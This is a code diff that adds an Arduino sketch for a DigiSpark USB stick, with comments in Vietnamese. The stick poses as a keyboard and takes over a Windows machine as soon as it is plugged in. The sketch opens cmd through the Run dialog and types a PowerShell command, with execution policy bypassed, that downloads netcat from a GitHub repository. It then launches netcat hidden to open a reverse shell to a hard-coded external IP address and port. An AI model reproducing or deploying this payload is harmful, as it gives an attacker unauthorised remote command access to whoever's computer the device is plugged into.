@@ -1,0 +1,28 @@
+#include <DigiKeyboard.h>
+
+void setup() {
+  // Chờ 2 giây để đảm bảo kết nối USB ổn định
+  DigiKeyboard.delay(2000);
+  
+  // Khởi tạo kết nối USB
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(1000);
+  
+  // Mở PowerShell
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("cmd");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  
+  // Gõ lệnh CmdShell
+ DigiKeyboard.println("cd / & mkdir win & cd win & echo (wget 'https://github.com/huyremy/netcat/raw/main/nc.exe' -OutFile nc.exe) > h.PS1 & powershell -ExecutionPolicy ByPass -File h.ps1");
+ DigiKeyboard.delay(1000);
+ DigiKeyboard.println("START /MIN nc.exe 97.74.89.193 6868 -e cmd.exe -d & exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
+
+void loop() {
+  // Không có hoạt động lặp
+}
